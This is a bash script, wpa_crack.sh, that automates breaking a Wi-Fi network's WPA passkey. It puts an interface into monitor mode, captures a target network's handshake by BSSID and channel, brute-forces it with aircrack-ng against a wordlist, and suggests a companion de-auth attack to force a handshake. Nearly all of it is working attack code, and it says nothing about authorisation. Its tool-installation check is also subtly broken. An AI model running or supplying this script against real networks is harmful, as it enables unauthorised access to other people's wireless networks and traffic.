#!/bin/bash

# Check for airmon-ng suite and install if necessary
installed=type airmon-ng >/dev/null 2>&1
while [[ $installed -eq 0 ]]
do
    echo >&2 "In order to run this script the $(tput bold)aircrack-ng$(tput sgr0) suite is required."
    echo -n "Would you like to install it using apt-get? [Y/n] "
    read answer
    if echo "$answer" | grep -iq "^y" ;then
        sudo apt-get install aircrack-ng
    else
        exit
    fi
    installed=type airmon-ng >/dev/null 2>&1
done

function ctrl_c() {
    clear
    echo "Caught CTRL-C interrupt, re-enabling wifi..."
    airmon-ng stop $interface
    exit
}

function show_help() {
    echo "Usage: wpa_crack.sh"
    echo
    echo -e "\t -h Show this help."
    echo -e "\t -w Use alternative wordlist file."
    echo
}

wordlist='darkc0de.lst'

OPTIND=1 # Reset in case getopts has been used previously in the shell.

while getopts "h?w:" opt; do
    case "$opt" in
    h|\?)
        show_help
        exit 0
        ;;
    w)  wordlist=$OPTARG
        ;;
    esac
done

shift $((OPTIND-1))
[ "$1" = "--" ] && shift

rm -f psk*.cap

trap ctrl_c SIGINT

clear
iwconfig

read -r -p "Enter the wireless interface to put into monitor mode: " interface

airmon-ng start $interface
clear
iwconfig

read -r -p "Enter the wireless interface to monitor (should be something with mon0 or whatever): " interface

trap - SIGINT
airodump-ng $interface
trap ctrl_c SIGINT

echo "Now we need to monitor the network for a handshake, capture it, and brute-force the capture file for a passkey."
echo "This can be done in conjunction with a de-auth attack. Use './de-auth.sh' in another terminal with the BSSID of the network and client."

read -r -p "Enter the BSSID of the network to monitor: " bssid
read -r -p "Enter the Channel of the network to monitor: " channel

trap - SIGINT
airodump-ng -c $channel --bssid $bssid -w psk $interface
trap ctrl_c SIGINT

aircrack-ng -w $wordlist -b $bssid psk*.cap

airmon-ng stop $interface
